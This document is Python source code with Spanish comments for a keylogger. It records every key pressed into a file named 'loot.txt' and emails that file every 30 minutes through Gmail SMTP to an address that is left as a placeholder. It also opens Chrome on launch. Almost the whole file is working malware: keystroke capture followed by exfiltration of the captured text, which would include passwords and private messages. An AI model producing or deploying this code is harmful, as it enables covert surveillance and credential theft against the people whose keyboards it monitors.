import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE
from email import encoders
import keyboard
import os
import time
import webbrowser

# Inicializar contador
count = 0
caps_lock_state = False
letters = []  

def on_press(event):
    global count
    global caps_lock_state
    global letters
    try:
        with open('loot.txt', 'a') as f:
            key = event.name
            if key == 'space':
                f.write(' ')
                letters.append(' ')
            elif key == 'caps lock':
                caps_lock_state = not caps_lock_state  
            elif key == 'backspace':
                if len(letters) > 0:
                    letters.pop() 
                    f.truncate(0)  
                    for letter in letters:
                        f.write(letter)
            elif key == 'enter':
                f.write('\n')  
                letters.append('\n')
            elif key in ['ñ', '@']:
                f.write(key)
                letters.append(key)
            elif key.startswith('numpad'):
                
                num = key.replace('numpad', '')
                f.write(num)
                letters.append(num)
            elif key not in ['ctrl', 'alt', 'alt gr']:  # Ignorar las teclas Ctrl, Alt y Alt Gr
                if caps_lock_state:
                    f.write(key.upper())
                    letters.append(key.upper())
                else:
                    f.write(key)
                    letters.append(key)

    except:
        print('Error al escribir en el archivo')

def clear_file():
    try:
        with open('loot.txt', 'w') as f:
            f.truncate()
            print('Contenido del archivo eliminado')
    except:
        print('Error al eliminar el contenido del archivo')

def send_email():
    # Configurar correo
    fromaddr = 'correo_receptor@gmail.com'
    toaddr = 'correo_emisor@gmail.com'
    password = 'contraseña_desarrorrador_de_correo_emisor'

    msg = MIMEMultipart()
    msg['from'] = fromaddr
    msg['to'] = toaddr
    msg['subject'] = 'Archivo de pulsaciones'

    body = 'Adjunto el archivo de pulsaciones.'
    msg.attach(MIMEText(body))

    filename = 'loot.txt'
    attachment = open(filename, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename= ' + filename)

    msg.attach(part)

    # Enviar correo
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

# Abrir google.com
os.system("start chrome")

# Iniciar listener de teclado
keyboard.on_press(on_press)

# Inicializar tiempo de inicio
start_time = time.time()

# Bucle para enviar el correo cada 30 minuto
while True:
    elapsed_time = time.time() - start_time
    if elapsed_time >= 1800:  # Si ha pasado 30 minuto
        send_email()
        clear_file()
        start_time = time.time()  # Reiniciar el tiempo de inicio
    time.sleep(1)  # Esperar 1 segundo antes de verificar nuevamente